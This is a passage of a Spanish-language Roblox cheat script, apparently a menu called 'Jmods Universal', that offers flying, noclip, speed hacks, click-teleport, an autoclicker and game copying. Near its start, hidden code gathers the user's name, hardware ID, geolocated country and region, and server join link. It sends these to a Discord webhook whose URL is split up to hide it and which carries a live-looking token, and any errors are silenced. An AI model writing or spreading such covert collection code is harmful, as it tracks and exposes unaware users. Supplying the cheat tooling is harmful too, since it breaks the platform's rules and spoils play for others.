            MD = "Moldavia", MA = "Marruecos", NL = "Países Bajos", NZ = "Nueva Zelanda",
            NI = "Nicaragua", NG = "Nigeria", NO = "Noruega", PA = "Panamá", PY = "Paraguay",
            PE = "Perú", PH = "Filipinas", PL = "Polonia", PT = "Portugal", RO = "Rumanía",
            RU = "Rusia", SA = "Arabia Saudita", RS = "Serbia", SG = "Singapur", SK = "Eslovaquia",
            SI = "Eslovenia", ZA = "Sudáfrica", ES = "España", SE = "Suecia", CH = "Suiza",
            TH = "Tailandia", TR = "Turquía", UA = "Ucrania", AE = "Emiratos Árabes Unidos",
            GB = "Reino Unido", US = "Estados Unidos", UY = "Uruguay", VE = "Venezuela", VN = "Vietnam"
        }

        local country = "Desconocido"
        local region = "Desconocido"

        local ipinfoReq = (syn and syn.request) or (http_request) or (request) or (http and http.request)
        if ipinfoReq then
            local geoResponse = ipinfoReq({
                Url = "https://ipinfo.io/json",
                Method = "GET"
            })
            if geoResponse and geoResponse.StatusCode == 200 then
                local geoData = HttpService:JSONDecode(geoResponse.Body)
                local countryCode = geoData.country or "Desconocido"
                country = countryNames[countryCode] and (countryNames[countryCode] .. " - " .. countryCode) or countryCode
                region = geoData.region or "Desconocido"
            end
        end

        local folderName = "Jmods_NotifyFlag"
        if not CoreGui:FindFirstChild(folderName) then
            local flag = Instance.new("Folder")
            flag.Name = folderName
            flag.Parent = CoreGui

            local embedData = {
                title = "✅ Jmods Universal",
                color = tonumber("FFC0CB", 16),
                thumbnail = {
                    url = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=420&height=420&format=png"
                },
                footer = {
                    text = "Jmods Universal",
                    icon_url = ""
                },
                fields = { {
                    name = "📌 Información",
                    value = "👤 Usuario: " .. player.Name .. " @" .. player.DisplayName .. "" ..
                            "\n🎮 Juego: " .. placeName ..
                            "\n🧠 Ejecutador: " .. ejecutador ..
                            "\n🆔 WHID: " .. whid .. "" ..
                            "\n🌍 País: " .. country ..
                            "\n🏙️ Región: " .. region ..
                            "\n🕒 Hora: " .. os.date("%Y-%m-%d %H:%M:%S") ..
                            "\n🌐 [Ver juego en la web](" .. webLink .. ")" ..
                            "\n🔗 Unirse al servidor:\n
" .. joinLink .. "
",
                    inline = true
                }},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }

            local jsonData = HttpService:JSONEncode({embeds = {embedData}})
            local link = "https://disc" .. "ord.com/api/we" .. "bhook" .. "s/1385412071830589552/XKZPpzAbj_6cjpNzTh50RHtBYXXirpdqi9jy1H49u8zIC7hbkPFP1KGnpLDY_P6VivH5"

            local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
            if req then
                req({
                    Url = link,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            end
        end
    end)

    if not success then
        -- silencioso
    end
end)




















-- SECCIÓN PRINCIPAL
MainTab = Window:CreateTab("Principal", nil) -- Title, Image
MainSection = MainTab:CreateSection("Main")


    Rayfield:Notify({
           Title = "Bienvenido",
       Content = "joao_mods te espera en youtube",
       Duration = 15,
       Image = 13458017478,
             Callback = function()
          end

    })
    
    
---barra de velocidad---
Slider = MainTab:CreateSlider({
       Name = "Velocidad al correr",
       Range = {1, 500},
       Increment = 1,
       Suffix = "velocidad",
       CurrentValue = 16,
       Flag = "sliderws", -- 
       Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
       end,
    })
    



----barra Salto----
Slider = MainTab:CreateSlider({
       Name = "Salto",
       Range = {1, 500},
       Increment = 1,
       Suffix = "Poder",
       CurrentValue = 16,
       Flag = "sliderjp", 
       Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
       end,
    })



    

-- Servicios
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

-- Variables compartidas
local player = Players.LocalPlayer
local character, hrp, humanoid
local currentSpeed = 16
local currentJumpHeight = 0.61
local keysPressed = {}
local sliding = false
local jumping = false
local toggleActive = false
local jumpKey = Enum.KeyCode.Space

-- UI móvil
local touchGui = Instance.new("ScreenGui")
touchGui.Name = "TouchControls"
touchGui.ResetOnSpawn = false
touchGui.Parent = player:WaitForChild("PlayerGui")

local jumpButton, wasdFrame

-- Funciones para crear UI
local function createJumpButton()
	if jumpButton then jumpButton:Destroy() end

	jumpButton = Instance.new("TextButton")
	jumpButton.Size = UDim2.new(0, 100, 0, 100)
	jumpButton.Position = UDim2.new(1, -120, 1, -120)
	jumpButton.Text = "⭧"
	jumpButton.TextScaled = true
	jumpButton.BackgroundColor3 = Color3.new(1, 1, 1)
	jumpButton.BackgroundTransparency = 0.2
	jumpButton.Parent = touchGui

	jumpButton.MouseButton1Down:Connect(function()
		if toggleActive then
			jumping = true
		end
	end)

	jumpButton.MouseButton1Up:Connect(function()
		jumping = false
	end)
end

local function createWASDFrame()
	if wasdFrame then wasdFrame:Destroy() end

	wasdFrame = Instance.new("Frame")
	wasdFrame.Size = UDim2.new(0, 200, 0, 200)
	wasdFrame.Position = UDim2.new(0, 20, 1, -220)
	wasdFrame.BackgroundTransparency = 1
	wasdFrame.Parent = touchGui

	local directions = {
		{key = Enum.KeyCode.W, pos = UDim2.new(0.5, -25, 0, 0), txt = "W"},
		{key = Enum.KeyCode.S, pos = UDim2.new(0.5, -25, 0, 100), txt = "S"},
		{key = Enum.KeyCode.A, pos = UDim2.new(0, 0, 0, 100), txt = "A"},
		{key = Enum.KeyCode.D, pos = UDim2.new(1, -50, 0, 100), txt = "D"},
	}

	for _, dir in ipairs(directions) do
		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(0, 50, 0, 50)
		btn.Position = dir.pos
		btn.Text = dir.txt
		btn.BackgroundColor3 = Color3.new(1, 1, 1)
		btn.BackgroundTransparency = 0.2
		btn.TextScaled = true
		btn.Parent = wasdFrame

		btn.MouseButton1Down:Connect(function()
			keysPressed[dir.key] = true
		end)

		btn.MouseButton1Up:Connect(function()
			keysPressed[dir.key] = false
		end)
	end
end

-- Input
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode then
		keysPressed[input.KeyCode] = true
	end
	if input.KeyCode == jumpKey and toggleActive then
		jumping = true
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode then
		keysPressed[input.KeyCode] = false
	end
	if input.KeyCode == jumpKey then
		jumping = false
	end
end)

-- Dirección
local function getDirection()
	local camCF = workspace.CurrentCamera.CFrame
	local moveDir = Vector3.zero

	if keysPressed[Enum.KeyCode.W] then moveDir += camCF.LookVector end
	if keysPressed[Enum.KeyCode.S] then moveDir -= camCF.LookVector end
	if keysPressed[Enum.KeyCode.A] then moveDir -= camCF.RightVector end
	if keysPressed[Enum.KeyCode.D] then moveDir += camCF.RightVector end

	moveDir = Vector3.new(moveDir.X, 0, moveDir.Z)
	return moveDir.Magnitude > 0 and moveDir.Unit or Vector3.zero
end

-- Movimiento
RunService.RenderStepped:Connect(function(dt)
	if sliding and hrp and character then
		local dir = getDirection()
		if dir.Magnitude > 0 then
			hrp.CFrame += dir * currentSpeed * dt
		end
	end
	if jumping and toggleActive and hrp then
		hrp.CFrame = hrp.CFrame + Vector3.new(0, currentJumpHeight, 0)
	end
end)

-- Setup personaje
local function setupCharacter(char)
	character = char
	hrp = character:WaitForChild("HumanoidRootPart")
	humanoid = character:WaitForChild("Humanoid")
	hrp.Anchored = false

	if sliding then
		humanoid.WalkSpeed = 0
	else
		humanoid.WalkSpeed = 16
	end
end

if player.Character then setupCharacter(player.Character) end
player.CharacterAdded:Connect(setupCharacter)

-- UI con Rayfield o el sistema que uses
MainTab:CreateToggle({
	Name = "Modo deslizamiento",
	CurrentValue = false,
	Flag = "slidetoggle",
	Callback = function(Value)
		sliding = Value
		if humanoid then
			humanoid.WalkSpeed = Value and 0 or 16
		end
		if UserInputService.TouchEnabled then
			if Value then
				createWASDFrame()
			elseif wasdFrame then
				wasdFrame:Destroy()
			end
		end
	end,
})

MainTab:CreateSlider({
	Name = "Velocidad deslizarse",
	Range = {1, 500},
	Increment = 1,
	Suffix = "velocidad",
	CurrentValue = currentSpeed,
	Flag = "sliderws",
	Callback = function(Value)
		currentSpeed = Value
	end,
})

MainTab:CreateToggle({
	Name = "Salto Deslizado",
	CurrentValue = false,
	Flag = "jumptoggle",
	Callback = function(Value)
		toggleActive = Value
		if not Value then
			jumping = false
		end
		if UserInputService.TouchEnabled then
			if Value then
				createJumpButton()
			elseif jumpButton then
				jumpButton:Destroy()
			end
		end
	end,
})

MainTab:CreateSlider({
	Name = "Altura del Salto",
	Range = {0.01, 7},
	Increment = 0.01,
	Suffix = " altura",
	CurrentValue = currentJumpHeight,
	Flag = "sliderjumpheight",
	Callback = function(Value)
		currentJumpHeight = Value
	end,
})







---Salto infinito----

Button = MainTab:CreateButton({
   Name = "Salto infinito",
   Callback = function()
       -- Toggles 
       _G.infinjump = not _G.infinjump


       if _G.infinJumpStarted == nil then
           _G.infinJumpStarted = true

           local plr = game:GetService('Players').LocalPlayer
           local m = plr:GetMouse()
           local UIS = game:GetService("UserInputService")

           -- Teclado (PC)
           m.KeyDown:Connect(function(k)
               if _G.infinjump and k:byte() == 32 then
                   local humanoid = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
                   if humanoid then
                       humanoid:ChangeState('Jumping')
                       wait()
                       humanoid:ChangeState('Seated')
                   end
               end
           end)

           -- Soporte Móvil (Touch/Jump Button)
           UIS.JumpRequest:Connect(function()
               if _G.infinjump then
                   local humanoid = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
                   if humanoid then
                       humanoid:ChangeState('Jumping')
                       wait()
                       humanoid:ChangeState('Seated')
                   end
               end
           end)
       end
   end,
})





----Pajas----   
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local toggleActive = false
local currentSpeed = 1
local track = nil
local humanoid = nil

-- Función para iniciar la animación
local function playLoopedAnimation()
	task.spawn(function()
		while toggleActive and humanoid do
			if track then
				track:Stop()
				track = nil
			end

			local isR15 = humanoid.RigType == Enum.HumanoidRigType.R15
			local anim = Instance.new("Animation")
			anim.AnimationId = isR15 and "rbxassetid://698251653" or "rbxassetid://72042024"
			track = humanoid:LoadAnimation(anim)

			local endTime = isR15 and 0.7 or 0.65

			track:Play()
			track:AdjustSpeed(currentSpeed)
			track.TimePosition = 0.6

			-- Espera hasta que termine o se apague el toggle
			while track and toggleActive and track.TimePosition < endTime do
				task.wait(0.05)
				track:AdjustSpeed(currentSpeed)
			end

			if track then
				track:Stop()
				track = nil
			end
		end
	end)
end

-- Toggle de animación
MainTab:CreateToggle({
	Name = "Animación Paja",
	CurrentValue = false,
	Flag = "PajaToggle",
	Callback = function(Value)
		toggleActive = Value

		local character = player.Character or player.CharacterAdded:Wait()
		humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if toggleActive then
			playLoopedAnimation()
		elseif track then
			track:Stop()
			track = nil
		end
	end,
})

-- Slider de velocidad
MainTab:CreateSlider({
	Name = "Velocidad de Animación",
	Range = {0.1, 1},
	Increment = 0.1,
	Suffix = "x",
	CurrentValue = currentSpeed,
	Flag = "SpeedSlider",
	Callback = function(Value)
		currentSpeed = Value
		if track then
			track:AdjustSpeed(currentSpeed)
		end
	end,
})

-- Reinicio del personaje
player.CharacterAdded:Connect(function(char)
	humanoid = char:WaitForChild("Humanoid")
	if toggleActive then
		playLoopedAnimation()
	end
end)







----Recuperar VC---
Button = MainTab:CreateButton({
   Name = "Recuperar Vc",
   Callback = function()
   game:GetService("VoiceChatService"):joinVoice()-- The function that takes place when the button is pressed
   end,
})

---Spin

local spinActive = false
local spinSpeed = 10 -- Velocidad predeterminada del giro
local spinAngle = 0

local function toggleSpin()
    spinActive = not spinActive
    if spinActive then
        Rayfield:Notify({
            Title = "Spin Activado",
            Content = "El giro ha comenzado.",
            Duration = 3,
            Image = 4483362458
        })
    else
        Rayfield:Notify({
            Title = "Spin Desactivado",
            Content = "El giro ha sido detenido.",
            Duration = 3,
            Image = 4483362458
        })
    end
end

local spinToggle = MainTab:CreateToggle({
    Name = "Spin",
    Callback = function()
        toggleSpin()
    end
})

-- Slider para ajustar la velocidad del Spin
MainTab:CreateSlider({
    Name = "Velocidad de Spin",
    Range = {1, 50},
    Increment = 1,
    Suffix = "vel",
    CurrentValue = spinSpeed,
    Callback = function(value)
        spinSpeed = value
    end
})

game:GetService("RunService").Heartbeat:Connect(function(dt)
    if spinActive then
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            spinAngle = spinAngle + spinSpeed * dt
            character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
        end
    end
end)




----Reset

Button = MainTab:CreateButton({
   Name = "Respawn",
   Callback = function()
		game.Players.LocalPlayer.Character:BreakJoints()
   end,
})

 -----Refresh---
 Button = MainTab:CreateButton({
    Name = "Respawn Guardando posición",
    Callback = function()
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:FindFirstChild("HumanoidRootPart")

        if hrp then
            local savedCFrame = hrp.CFrame

            -- Conectamos a CharacterAdded para volver a teletransportarlo cuando reaparezca
            local connection
            connection = player.CharacterAdded:Connect(function(char)
                local newHrp = char:WaitForChild("HumanoidRootPart", 5)
                if newHrp then
                    newHrp.CFrame = savedCFrame
                end
                connection:Disconnect()
            end)

            -- Matamos al personaje
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end,
})






---Quitar cooldown E---

Button = MainTab:CreateButton({
   Name = "Quitar Cooldown E",
   Callback = function()
   for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
	if v:IsA("ProximityPrompt") then
		v["HoldDuration"] = 0
	end
end
 
 
game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(v)
    v["HoldDuration"] = 0
end)
   end,
})


---Gravedad---	
Button = MainTab:CreateButton({
   Name = "Gravedad 0",
   Callback = function()
   local plr = game:GetService("Players").LocalPlayer
local normalGravity = workspace.Gravity


local function MUBRZ_fake_script()

    workspace.Gravity = 0

    local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        humanoid.Sit = true
        task.wait(0.1) -- Esperamos un poco


        humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)

        
        for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
    end


    game:GetService("UserInputService").JumpRequest:Connect(function()
        workspace.Gravity = normalGravity 	
    end)
end


coroutine.wrap(MUBRZ_fake_script)()


   end,
})
----Noclip----

local noclipEnabled = false
local noclipConnection
local originalCollisions = {}

MainTab:CreateToggle({
    Name = "Noclip Act/Des",
    Flag = "NoclipToggle", -- <--- Añadido Flag
    CurrentValue = false,
    Callback = function(state)
        noclipEnabled = state
        local character = game.Players.LocalPlayer.Character

        if noclipEnabled then
            -- Guardar estado original
            originalCollisions = {}
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    originalCollisions[part] = part.CanCollide
                end
            end

            noclipConnection = game:GetService("RunService").Stepped:Connect(function()
                for part, _ in pairs(originalCollisions) do
                    if part and part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        else
            if noclipConnection then
                noclipConnection:Disconnect()
                noclipConnection = nil
            end
            -- Restaurar el estado original
            for part, originalState in pairs(originalCollisions) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = originalState
                end
            end
            originalCollisions = {}
        end
    end,
})






------Fly-----

local UIS = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
local RootPart = Character:FindFirstChild("HumanoidRootPart")

local FlyEnabled = false
local FlySpeed = 50
local Connection
local MobileGui = nil

local MobileMove = {
    Forward = false,
    Backward = false,
    Left = false,
    Right = false,
    Up = false,
    Down = false,
}

-- Función para actualizar el personaje y sus componentes
local function UpdateCharacter(newCharacter)
    Character = newCharacter
    Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
    RootPart = Character:FindFirstChild("HumanoidRootPart")
end

-- Actualizar referencias cuando el personaje cambia
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    newCharacter:WaitForChild("HumanoidRootPart")
    newCharacter:WaitForChild("Humanoid")
    UpdateCharacter(newCharacter)
    if FlyEnabled then
        ToggleFly(false)
        ToggleFly(true)
    end
end)

-- Crear controles móviles
local function CreateMobileControls()
    if not UIS.TouchEnabled or MobileGui then return end

    MobileGui = Instance.new("ScreenGui")
    MobileGui.Name = "MobileFlyControls"
    MobileGui.ResetOnSpawn = false
    MobileGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local ButtonSize = UDim2.new(0, 60, 0, 60)

    local function CreateButton(name, position, onPress, onRelease)
        local Button = Instance.new("TextButton")
        Button.Name = name
        Button.Size = ButtonSize
        Button.Position = position
        Button.Text = name
        Button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        Button.TextColor3 = Color3.new(1, 1, 1)
        Button.AutoButtonColor = false
        Button.Parent = MobileGui

        Button.MouseButton1Down:Connect(function()
            onPress()
        end)

        Button.MouseButton1Up:Connect(function()
            onRelease()
        end)
    end

    CreateButton("W", UDim2.new(0, 80, 1, -180), function() MobileMove.Forward = true end, function() MobileMove.Forward = false end)
    CreateButton("S", UDim2.new(0, 80, 1, -60), function() MobileMove.Backward = true end, function() MobileMove.Backward = false end)
    CreateButton("A", UDim2.new(0, 20, 1, -120), function() MobileMove.Left = true end, function() MobileMove.Left = false end)
    CreateButton("D", UDim2.new(0, 140, 1, -120), function() MobileMove.Right = true end, function() MobileMove.Right = false end)
    CreateButton("Up", UDim2.new(1, -120, 1, -180), function() MobileMove.Up = true end, function() MobileMove.Up = false end)
    CreateButton("Down", UDim2.new(1, -120, 1, -100), function() MobileMove.Down = true end, function() MobileMove.Down = false end)
end

local function DestroyMobileControls()
    if MobileGui then
        MobileGui:Destroy()
        MobileGui = nil
    end
    for key in pairs(MobileMove) do
        MobileMove[key] = false
    end
end

--toggle
function ToggleFly(state)
    if not RootPart or not Humanoid then
        return
    end

    FlyEnabled = state

    if FlyEnabled then
        -- Activar controles móviles si es touch
        if UIS.TouchEnabled then
            CreateMobileControls()
        end

        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        Humanoid:ChangeState(Enum.HumanoidStateType.Physics)

        Connection = RunService.RenderStepped:Connect(function()
            local MoveDirection = Vector3.new()
            local cameraCFrame = Workspace.CurrentCamera.CFrame
            local forward = cameraCFrame.LookVector
            local right = cameraCFrame.RightVector
            local up = Vector3.new(0, 1, 0)

            if UIS:IsKeyDown(Enum.KeyCode.W) or MobileMove.Forward then MoveDirection = MoveDirection + forward end
            if UIS:IsKeyDown(Enum.KeyCode.S) or MobileMove.Backward then MoveDirection = MoveDirection - forward end
            if UIS:IsKeyDown(Enum.KeyCode.A) or MobileMove.Left then MoveDirection = MoveDirection - right end
            if UIS:IsKeyDown(Enum.KeyCode.D) or MobileMove.Right then MoveDirection = MoveDirection + right end
            if UIS:IsKeyDown(Enum.KeyCode.Space) or MobileMove.Up then MoveDirection = MoveDirection + up end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or MobileMove.Down then MoveDirection = MoveDirection - up end

            if MoveDirection.Magnitude == 0 then
                RootPart.Velocity = Vector3.new(0, 0, 0)
            else
                RootPart.Velocity = MoveDirection.Unit * FlySpeed
            end
        end)
    else
        if Connection then
            Connection:Disconnect()
            Connection = nil
        end

        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)

        -- Desactivar controles móviles si estaban activos
        DestroyMobileControls()
    end
end

-- UI Rayfield
FlyToggle = MainTab:CreateToggle({
    Name = "Volar Gravedad 0",
    CurrentValue = false,
    Callback = function(state)
        ToggleFly(state)
    end
})

FlySpeedSlider = MainTab:CreateSlider({
    Name = "Velocidad Gravedad 0",
    Range = {0, 300},
    Increment = 5,
    Suffix = "Velocidad",
    CurrentValue = FlySpeed,
    Callback = function(value)
        FlySpeed = value
    end
})






---Zoon sin limite--

local LocalPlayer = Players.LocalPlayer
local CameraMaxZoom = 4000  
local DefaultMaxZoom = LocalPlayer.CameraMaxZoomDistance  -- Guardar el valor original

local ZoomUnlocked = false

local function ToggleZoom(state)
    ZoomUnlocked = state

    if ZoomUnlocked then
        LocalPlayer.CameraMaxZoomDistance = CameraMaxZoom
    else
        LocalPlayer.CameraMaxZoomDistance = DefaultMaxZoom
    end
end

-- Crear el Toggle en Rayfield
ZoomToggle = MainTab:CreateToggle({
    Name = "Zoom sin limite",
    CurrentValue = false,
    Callback = function(state)
        ToggleZoom(state)
    end
})

-----Fog-----

local Lighting = game:GetService("Lighting")

-- Guardamos los valores originales del fog
local originalFogStart = Lighting.FogStart
local originalFogEnd = Lighting.FogEnd
local originalFogColor = Lighting.FogColor

-- Función para quitar el fog
local function removeFog()
    Lighting.FogStart = 1000000  
    Lighting.FogEnd = 1000000    

end

-- Función para restaurar el fog a su estado original
local function restoreFog()
    Lighting.FogStart = originalFogStart  
    Lighting.FogEnd = originalFogEnd    
    Lighting.FogColor = originalFogColor 

end


Toggle = MainTab:CreateToggle({
    Name = "Quitar Fog",
    CurrentValue = false,  
    Flag = "RemoveFogToggle",  
    Callback = function(value)
        if value then
            removeFog()  
        else
            restoreFog()  
        end
    end,
})

---Fov---

local FOVEnabled = false
local LastFOVValue = workspace.CurrentCamera.FieldOfView

-- Toggle para activar/desactivar el FOV personalizado
MainTab:CreateToggle({
    Name = "FOV",
    CurrentValue = false,
    Flag = "FOVEnabledToggle",
    Callback = function(state)
        FOVEnabled = state
        if not state then
            workspace.CurrentCamera.FieldOfView = 70
        else
            workspace.CurrentCamera.FieldOfView = LastFOVValue
        end
    end,
})

-- Slider para el FOV
MainTab:CreateSlider({
    Name = "Cambiar Fov",
    Range = {40, 120},
    Increment = 1,
    Suffix = "°",
    CurrentValue = LastFOVValue,
    Flag = "FOVSlider",
    Callback = function(val)
        LastFOVValue = val
        if FOVEnabled then
            workspace.CurrentCamera.FieldOfView = val
        end
    end,
})




----CLick tp y delete
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

local humanoidRootPart
local ctrlPressed = false
local altPressed = false

-- Función para actualizar HRP
local function updateCharacter()
    local character = player.Character or player.CharacterAdded:Wait()
    humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
end
task.spawn(updateCharacter)
player.CharacterAdded:Connect(updateCharacter)

-- Estados de toggle
local teleportEnabled = false
local deleteEnabled = false

-- Esperar a que MainTab exista antes de crear los toggles
local function waitForMainTab()
    while not MainTab do
        task.wait(0.1)  -- Esperar hasta que MainTab esté disponible
    end
end

-- Llamar a waitForMainTab antes de crear los toggles
task.spawn(function()
    waitForMainTab()

    -- Crear los toggles en MainTab
    pcall(function()
        MainTab:CreateToggle({
            Name = "Control Click Teleport",
            CurrentValue = false,
            Flag = "TeleportToggle",
            Callback = function(v) teleportEnabled = v end,
        })

        MainTab:CreateToggle({
            Name = "Alt + Click Delete",
            CurrentValue = false,
            Flag = "AltClickDeleteToggle",
            Callback = function(v) deleteEnabled = v end,
        })
    end)
end)

-- Input
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.LeftControl then ctrlPressed = true end
        if input.KeyCode == Enum.KeyCode.LeftAlt then altPressed = true end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.LeftControl then ctrlPressed = false end
        if input.KeyCode == Enum.KeyCode.LeftAlt then altPressed = false end
    end
end)

-- Click handler
mouse.Button1Down:Connect(function()
    local target = mouse.Target
    if teleportEnabled and ctrlPressed and humanoidRootPart then
        humanoidRootPart.CFrame = CFrame.new(mouse.Hit.Position)
    end
    if deleteEnabled and altPressed and target and target:IsA("BasePart") then
        target:Destroy()
    end
end)


---Ver FPS--
local fpsGui
local FpsLabel
local fpsConnection
local selectedColor = Color3.fromRGB(44, 255, 8)

-- Puedes cambiar esta posición si quieres mover el visor manualmente
local fpsPosition = UDim2.new(0.786, 0, 0, 0) -- Esquina superior derecha

-- Toggle para mostrar u ocultar el visor de FPS
Toggle = MainTab:CreateToggle({
    Name = "Mostrar FPS",
    CurrentValue = false,
    Flag = "FPS_Toggle",
    Callback = function(state)
        if state then
            -- Crear GUI de FPS
            fpsGui = Instance.new("ScreenGui")
            FpsLabel = Instance.new("TextLabel")

            fpsGui.Name = "FPSGui"
            fpsGui.ResetOnSpawn = false
            fpsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            fpsGui.Parent = game.CoreGui

            FpsLabel.Name = "FpsLabel"
            FpsLabel.Parent = fpsGui
            FpsLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            FpsLabel.BackgroundTransparency = 1
            FpsLabel.Position = fpsPosition
            FpsLabel.Size = UDim2.new(0, 125, 0, 25)
            FpsLabel.Font = Enum.Font.SourceSans
            FpsLabel.TextColor3 = selectedColor
            FpsLabel.TextScaled = true
            FpsLabel.Text = "FPS: ..."
            FpsLabel.TextWrapped = true

            fpsConnection = RunService.RenderStepped:Connect(function(dt)
                if not FpsLabel or not FpsLabel.Parent then
                    if fpsConnection then fpsConnection:Disconnect() end
                    return
                end
                FpsLabel.Text = "FPS: " .. math.round(1 / dt)
            end)
        else
            -- Eliminar GUI y desconectar
            if fpsGui then fpsGui:Destroy() fpsGui = nil end
            if fpsConnection then fpsConnection:Disconnect() fpsConnection = nil end
        end
    end,
})

-- ColorPicker para cambiar el color del texto FPS
MainTab:CreateColorPicker({
    Name = "Color de FPS",
    Color = selectedColor,
    Flag = "FPS_Color",
    Callback = function(color)
        selectedColor = color
        if FpsLabel then
            FpsLabel.TextColor3 = selectedColor
        end
    end,
})

-- Slider para cambiar el tamaño del texto FPS
MainTab:CreateSlider({
    Name = "Tamaño del texto FPS",
    Range = {10, 50},
    Increment = 1,
    Suffix = "+",
    CurrentValue = 20,
    Callback = function(size)
        if FpsLabel then
            FpsLabel.TextScaled = false -- Para usar TextSize directamente
            FpsLabel.TextSize = size
        end
    end
})




----Guardar juegos---

Button = MainTab:CreateButton({

    Name = "Guardar juego",
    Callback = function()
        saveinstance();
    end,
 })
 





----Autoclicker----

local VirtualInputManager = game:GetService("VirtualInputManager")

-- Estados
local autoClicking = false
local toggleEnabled = false
local clickDelay = 0.1 -- valor inicial, ajustable por el slider

-- Bucle del autoclicker
task.spawn(function()
	while task.wait() do
		if autoClicking and toggleEnabled then
			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
		end
		task.wait(clickDelay)
	end
end)

-- Toggle (maestro)
AutoClickerToggle = MainTab:CreateToggle({
	Name = "Auto Clicker (primero activar)",
	CurrentValue = false,
	Flag = "AutoClickerToggle",
	Callback = function(Value)
		toggleEnabled = Value
		if not Value then
			autoClicking = false
		end
	end,
})

-- Keybind (solo funciona si el toggle está activo)
MainTab:CreateKeybind({
	Name = "Bind Auto Click",
	CurrentKeybind = "E",
	HoldToInteract = false,
	Flag = "AutoClickerKeybind",
	Callback = function()
		if toggleEnabled then
			autoClicking = not autoClicking
		end
	end,
})

-- Slider para velocidad (menor = más rápido)
MainTab:CreateSlider({
	Name = "Velocidad AutoClicker",
	Range = {0, 1}, -- 0.01 = muy rápido, 1 = más lento
	Increment = 0.01,
	Suffix = "s",
	CurrentValue = clickDelay,
	Flag = "ClickDelaySlider",
	Callback = function(Value)
		clickDelay = Value
	end,
})
----Camara libre---



local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local freecamEnabled = false
local moveDirection = Vector3.zero
local camRotation = Vector2.new()
local camPosition = Vector3.zero
local speed = 1.5
local keysHeld = {}
local toggleActive = false
local sensitivity = 0.005

local lastTouchPosition = nil
local guiFrames = nil -- los botones de movimiento

-- Congelar personaje
local function FreezeCharacter()
	local char = player.Character
	if char then
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = false
			humanoid.WalkSpeed = 0
			humanoid.JumpPower = 0
		end
	end
end

-- Restaurar personaje
local function UnfreezeCharacter()
	local char = player.Character
	if char then
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = true
			humanoid.WalkSpeed = 16
			humanoid.JumpPower = 50
		end
	end
end

-- Crear GUI táctil
local function CreateTouchGui()
	guiFrames = Instance.new("ScreenGui")
	guiFrames.Name = "MobileMovementGui"
	guiFrames.ResetOnSpawn = false
	guiFrames.Parent = player:WaitForChild("PlayerGui")

	local function CreateButton(name, position, keycode)
		local button = Instance.new("TextButton")
		button.Name = name
		button.Size = UDim2.new(0, 60, 0, 60)
		button.Position = position
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		button.Text = name
		button.TextColor3 = Color3.new(1, 1, 1)
		button.TextScaled = true
		button.Parent = guiFrames

		button.MouseButton1Down:Connect(function()
			keysHeld[keycode] = true
		end)
		button.MouseButton1Up:Connect(function()
			keysHeld[keycode] = false
		end)
	end

	-- Crear los botones
